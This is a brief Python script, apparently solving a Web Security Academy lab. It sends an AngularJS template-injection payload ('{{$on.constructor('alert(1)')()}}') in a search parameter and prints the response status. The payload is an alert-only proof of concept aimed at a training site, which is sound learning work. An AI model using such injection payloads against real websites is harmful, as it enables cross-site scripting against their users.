import requests

url = "https://0a7900df042877b282258d8d00a50021.web-security-academy.net/"
payload = "{{$on.constructor('alert(1)')()}}"

response = requests.get(url + "?search=" + payload)
print(response.status_code)
